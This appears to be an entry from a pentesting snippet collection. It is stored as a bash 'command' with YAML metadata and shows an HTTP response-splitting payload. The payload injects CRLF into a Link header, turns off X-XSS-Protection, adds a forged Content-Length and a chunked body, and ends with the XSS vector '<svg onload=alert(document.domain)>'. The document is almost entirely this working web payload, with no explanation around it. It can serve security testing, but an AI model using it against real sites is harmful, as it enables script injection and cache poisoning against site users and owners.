---
id: ce2efd65-4c27-4837-b95c-afabb6d88859
name: HTTP Response
type: command
executor: bash
data: 'HTTP/1.1 200 OK

  Date: Tue, 20 Dec 2016 14:34:03 GMT

  Content-Type: text/html; charset=utf-8

  Content-Length: 22907

  Connection: close

  X-Frame-Options: SAMEORIGIN

  Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT

  ETag: "842fe-597b-54415a5c97a80"

  Vary: Accept-Encoding

  X-UA-Compatible: IE=edge

  Server: NetDNA-cache/2.2

  Link: <https://example.com/[INJECTION STARTS HERE]

  Content-Length:35

  X-XSS-Protection:0

  23

  <svg onload=alert(document.domain)>

  0'
output: null
created_at: '2023-04-06T03:55:56.014351+00:00'
updated_at: '2023-04-10T20:21:23.691694+00:00'
---

# HTTP Response

```bash
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```
